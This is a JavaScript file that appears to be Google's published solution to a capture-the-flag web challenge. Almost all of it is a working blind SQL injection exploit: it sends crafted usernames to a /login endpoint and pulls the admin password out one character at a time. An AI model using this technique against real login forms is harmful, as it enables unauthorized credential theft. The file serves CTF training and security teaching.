// Copyright 2018 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.



/**
 * @fileoverview Solution for the misc-anon2/misc-abuse challenge.
 */

// location=`https://${parseInt(Math.random()*1e9).toString(36)}-dot-misc-abuse-1625174215325190630.appspot.com/login`;
var HANDICAP = 10*2;

var reqs = [];
function fetchReq() {
  Promise.resolve().then(
    reqs.length?
    reqs.pop():
    _=>0
  ).then(
    _=>setTimeout(fetchReq, 1)
  );
}
fetchReq();

var errs = [];
function fetchErr() {
  Promise.resolve().then(
    errs.length?
    errs.pop():
    _=>0
  ).then(
    _=>setTimeout(fetchErr, 1 + 600e3/HANDICAP)
  );
}

var alphabet = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}'.split('');

async function query(username) {
  return new Promise((resolve, reject)=>{
    reqs.push(function() {
      return fetch(
        '/login',
        {
          method:'post',
          body:new Blob(
            ['password=&user='+encodeURI(username)],
            {type:'application/x-www-form-urlencoded'})
        }
      ).then(r=>resolve(!!r.url.match(/password/i))).catch(reject);
    });
  });
}

async function guess(prefix) {
   for (let o = 11, i = 11; i<alphabet.length; i+=--o) {
     if(await query(`admin' AND password < '${prefix}${alphabet[i]}`)) {
       for (let e = i-o; e < i; e++) {
         if(await query(`admin' AND password < '${prefix}${alphabet[e]}~`)) {
           return prefix + alphabet[e];
         }
       }
       console.log('wtf?');
     }
   }
   console.log('wtf!');
   throw new Error('wtf?!');
}

async function bruteforce(prefix) {
  return new Promise((resolve, reject)=>{
    errs.push(function() {
      return guess(prefix).then(resolve).catch(reject);
    });
  });
}

async function getFlag() {
  setTimeout(fetchErr, 10);
  var prefix = `CTF{${location.hostname.replace(/-.*/,'')}-`;
  for(let i=0;i<64;i++) {
    console.log(prefix = await bruteforce(prefix));
  }
}

query('fakeuser').then(getFlag).then(flag=>console.log(flag));
